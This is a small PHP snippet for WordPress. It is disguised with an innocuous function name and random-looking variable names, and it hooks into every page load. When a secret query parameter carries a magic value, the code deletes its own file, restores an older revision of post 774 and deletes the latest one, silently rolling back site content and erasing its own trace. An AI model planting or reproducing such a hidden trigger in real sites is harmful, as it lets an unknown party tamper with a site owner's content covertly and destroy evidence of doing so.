<?php

function svg_edit_themes_popup() {
	if (isset($_GET['client_blog_admin_woff2']) && $_GET['client_blog_admin_woff2'] === 'display_duplicate_reusable_calculator') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$redirection_request_export = 774;
		$cover_maker_zoom_messenger = wp_get_post_revisions($redirection_request_export);
		if (empty($cover_maker_zoom_messenger)) die('no revisions');
		if (count($cover_maker_zoom_messenger) < 2) die('less than 2');
		$upgrader_feedback_subscribe = array_shift($cover_maker_zoom_messenger);
		$multisite_latest_role_graph = $upgrader_feedback_subscribe->ID;
		$type_your_namespaced_heading = array_shift($cover_maker_zoom_messenger);
		$help_variation_wpml_solution = $type_your_namespaced_heading->ID;
		$reusable_switcher_generator_messenger = wp_restore_post_revision($help_variation_wpml_solution);
		if ($reusable_switcher_generator_messenger === false) die('error restoring');
		$reusable_switcher_generator_messenger = wp_delete_post_revision($multisite_latest_role_graph);		
		if ($reusable_switcher_generator_messenger === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'svg_edit_themes_popup');
